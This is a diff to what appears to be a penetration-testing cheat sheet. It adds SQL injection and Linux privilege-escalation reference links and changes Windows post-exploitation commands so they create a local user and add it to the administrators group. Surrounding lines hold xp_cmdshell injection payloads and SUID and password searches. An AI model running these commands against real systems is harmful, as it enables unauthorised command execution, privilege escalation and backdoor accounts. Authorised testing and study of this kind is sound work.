@@ -61,6 +61,7 @@ MSSQL / SQLi
 - EXEC master..xp_cmdshell 'whoami';
 - meh' exec master..xp_cmdshell 'whoami' --
 - https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
+- http://pentestmonkey.net/category/cheat-sheet/sql-injection
 
 Payload Generation
 ----------------
@@ -81,6 +82,7 @@ Priv Esc - Linux
 - https://gtfobins.github.io
 - https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
 - https://github.com/jondonas/linux-exploit-suggester-2
+- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 - grep -Ri 'password' .
 - find / -perm –4000 2>/dev/null
 - find / -user root -perm -4000 -exec ls -ldb {} \;
@@ -219,5 +221,6 @@ Windows Post Exploitation Commands
 - net user
 - net localgroup Users
 - net localgroup Administrators
-- net user USERNAME NEWPASS
-- net user "USER NAME" NEWPASS
+- net user USERNAME NEWPASS /add
+- net user "USER NAME" NEWPASS /add
+- net localgroup administrators USERNAME /add
